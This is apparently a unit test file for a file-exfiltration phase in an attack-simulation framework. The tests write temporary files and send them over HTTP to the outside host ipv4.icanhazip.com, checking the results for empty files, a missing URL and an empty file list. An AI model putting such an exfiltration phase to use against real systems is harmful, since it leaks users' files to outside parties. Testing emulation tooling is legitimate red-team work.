from ai_utils.phases.exfiltrate_files_over_http import ExfiltrateFilesOverHttpPhaseClass
from ai_utils.ai_logging.simplelogger import AiLoggerClass
from ai_utils.utils.pathutils import PathUtilsClass
from ai_utils.utils.fileutils import FileUtilsClass
import unittest
import logging


class TestExfiltrateFilesOverHttpPhaseClass(unittest.TestCase):

    def setUp(self):
        AiLoggerClass(loggingLevel=logging.DEBUG).Enable()
        self.empty_file = self._get_empty_file()
        self.valid_files_to_exfiltrate = self._get_valid_files()
        self.valid_exfiltration_url = self._get_valid_exfiltration_url()

    def tearDown(self):
        FileUtilsClass.DeleteFile(self.empty_file)
        for valid_file in self.valid_files_to_exfiltrate:
            FileUtilsClass.DeleteFile(valid_file)

    def test_valid_parameters(self):
        phase = ExfiltrateFilesOverHttpPhaseClass(True, self.valid_exfiltration_url, self.valid_files_to_exfiltrate)
        success = phase.Execute()
        self.assertTrue(success)

    def test_exfil_with_empty_file(self):
        phase = ExfiltrateFilesOverHttpPhaseClass(True, self.valid_exfiltration_url, [self.empty_file])
        success = phase.Execute()
        self.assertFalse(success)

    def test_without_exfil_url(self):
        phase = ExfiltrateFilesOverHttpPhaseClass(True, '', self.valid_files_to_exfiltrate)
        success = phase.Execute()
        self.assertFalse(success)

    def test_without_exfil_files(self):
        phase = ExfiltrateFilesOverHttpPhaseClass(True, self.valid_exfiltration_url, [])
        success = phase.Execute()
        self.assertFalse(success)

    def _get_valid_files(self):
        valid_files = [PathUtilsClass.GetTempFile('ai_test', '.txt'), PathUtilsClass.GetTempFile('ai_test', '.txt')]
        for valid_file in valid_files:
            FileUtilsClass.WriteToFile(valid_file, 'Test file')
        return valid_files

    def _get_empty_file(self):
        return PathUtilsClass.GetTempFile('ai_test_empty', '.txt')

    def _get_valid_exfiltration_url(self):
        return 'ipv4.icanhazip.com'
